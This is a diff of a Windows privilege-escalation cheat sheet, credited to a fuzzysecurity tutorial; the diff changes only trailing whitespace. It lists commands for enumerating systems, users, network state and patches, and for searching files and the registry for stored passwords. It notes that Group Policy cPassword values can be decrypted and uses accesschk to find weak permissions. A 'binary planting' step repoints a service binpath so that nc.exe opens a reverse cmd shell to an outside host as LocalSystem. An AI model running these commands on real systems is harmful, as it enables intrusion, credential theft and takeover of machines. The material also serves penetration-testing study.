@@ -1,117 +1,117 @@
 
-// What system are we connected to?
+// What system are we connected to?  
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
 
-// Get the hostname and username (if available)
-hostname
+// Get the hostname and username (if available)  
+hostname  
 echo %username%
 
-// Get users
-net users
+// Get users  
+net users  
 net user [username]
 
-// Networking stuff
-ipconfig /all
+// Networking stuff  
+ipconfig /all  
 
-// Routing tables
-route print
+// Routing tables  
+route print  
 
-// ARP cache table for all interfaces
-arp -A
+// ARP cache table for all interfaces  
+arp -A  
 
-// Active network connections
-netstat -ano
+// Active network connections  
+netstat -ano  
 
-// Firewall fun (Win XP SP2+ only)
-netsh firewall show state
-netsh firewall show config
+// Firewall fun (Win XP SP2+ only)  
+netsh firewall show state  
+netsh firewall show config  
 
-// Scheduled tasks
-schtasks /query /fo LIST /v
+// Scheduled tasks  
+schtasks /query /fo LIST /v  
 
-// List all started services (DISPLAY_NAME)
-net start
+// List all started services (DISPLAY_NAME)  
+net start  
 
-// List running processes
-tasklist
+// List running processes  
+tasklist  
 
-// Mapping of running processes to started services
-tasklist /SVC
+// Mapping of running processes to started services  
+tasklist /SVC  
 
-// List all drivers
-DRIVERQUERY
+// List all drivers  
+DRIVERQUERY  
 
-// WMIC fun (Win 7/8 -- XP requires admin)
-wmic /?
+// WMIC fun (Win 7/8 -- XP requires admin)  
+wmic /?  
 
-// WMIC: check patch level
-wmic qfe get Caption,Description,HotFixID,InstalledOn
+// WMIC: check patch level  
+wmic qfe get Caption,Description,HotFixID,InstalledOn  
 
-// Search pathces for given patch
-wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."
+// Search pathces for given patch  
+wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."  
 
-// AlwaysInstallElevated fun
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
-reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+// AlwaysInstallElevated fun  
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated  
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated  
 
-### Quick wins
----
+### Quick wins  
+---  
 
-// Quick wins
-dir /s *pass* == *cred* == *vnc* == *.config*
-findstr /si password *.xml *.ini *.txt
-reg query HKLM /f password /t REG_SZ /s
-reg query HKCU /f password /t REG_SZ /s
+// Quick wins  
+dir /s *pass* == *cred* == *vnc* == *.config*  
+findstr /si password *.xml *.ini *.txt  
+reg query HKLM /f password /t REG_SZ /s  
+reg query HKCU /f password /t REG_SZ /s  
 
-// Policy Preference files that may have "cPassword" attribute set:
-Groups.xml: documented password encryption, can be decrypted **SOS**
-Services\Services.xml: Element-Specific Attributes
-ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element
-Printers\Printers.xml: SharedPrinter Element
-Drives\Drives.xml: Element-Specific Attributes
-DataSources\DataSources.xml: Element-Specific Attributes
+// Policy Preference files that may have "cPassword" attribute set:  
+Groups.xml: documented password encryption, can be decrypted **SOS**  
+Services\Services.xml: Element-Specific Attributes  
+ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element  
+Printers\Printers.xml: SharedPrinter Element  
+Drives\Drives.xml: Element-Specific Attributes  
+DataSources\DataSources.xml: Element-Specific Attributes  
 
-// Service permissions
-sc query
-sc qc [service_name]
+// Service permissions  
+sc query  
+sc qc [service_name]  
 
-### Accesschk
----
+### Accesschk  
+---  
 
-// Accesschk (part of "sysinternals")
-accesschk.exe /accepteula (need to add that if you don't have GUI. maybe only the first time?)
+// Accesschk (part of "sysinternals")  
+accesschk.exe /accepteula (need to add that if you don't have GUI. maybe only the first time?)  
 
-// List all user permissions
-accesschk.exe “domain\user” -a *
+// List all user permissions  
+accesschk.exe “domain\user” -a *  
 
-// List all service permissions for username
-accesschk.exe <username> -c *
+// List all service permissions for username  
+accesschk.exe <username> -c *  
 
-// display permissions on every file
-accesschk.exe /accepteula -s -d IWAM_BOB c:\*.*
-// only Read-Write
-acaccesschk.exe /accepteula -s -d IWAM_BOB c:\*.* | find "RW" 
+// display permissions on every file  
+accesschk.exe /accepteula -s -d IWAM_BOB c:\*.*  
+// only Read-Write  
+acaccesschk.exe /accepteula -s -d IWAM_BOB c:\*.* | find "RW"   
 
-accesschk.exe -ucqv [service_name] 
-accesschk.exe -uwcqv "[Group name you belong to]" * 
+accesschk.exe -ucqv [service_name]   
+accesschk.exe -uwcqv "[Group name you belong to]" *   
 
-// Find all weak folder permissions per drive.
-accesschk.exe -uwdqs Users c:\
-accesschk.exe -uwdqs "[Group name you belong to]" c:\
+// Find all weak folder permissions per drive.  
+accesschk.exe -uwdqs Users c:\  
+accesschk.exe -uwdqs "[Group name you belong to]" c:\  
 
-// Find all weak file permissions per drive.
-accesschk.exe -uwqs Users c:\*.*
-accesschk.exe -uwqs "[Group name you belong to]" c:\*.*
+// Find all weak file permissions per drive.  
+accesschk.exe -uwqs Users c:\*.*  
+accesschk.exe -uwqs "[Group name you belong to]" c:\*.*  
 
-// Binary planting
-sc config [service_name] binpath= "C:\nc.exe -nv [RHOST] [RPORT] -e C:\WINDOWS\System32\cmd.exe"
-sc config [service_name] obj= ".\LocalSystem" password= ""
-sc qc [service_name] (to verify!)
+// Binary planting  
+sc config [service_name] binpath= "C:\nc.exe -nv [RHOST] [RPORT] -e C:\WINDOWS\System32\cmd.exe"  
+sc config [service_name] obj= ".\LocalSystem" password= ""  
+sc qc [service_name] (to verify!)  
 
-// add user to local group
-net localgroup "Users" IWAM_BOB /add
+// add user to local group  
+net localgroup "Users" IWAM_BOB /add  
 
-Mostly all of this taken from http://www.fuzzysecurity.com/tutorials/16.html [1]
+Mostly all of this taken from http://www.fuzzysecurity.com/tutorials/16.html [1]  
 
 Links:
 ---
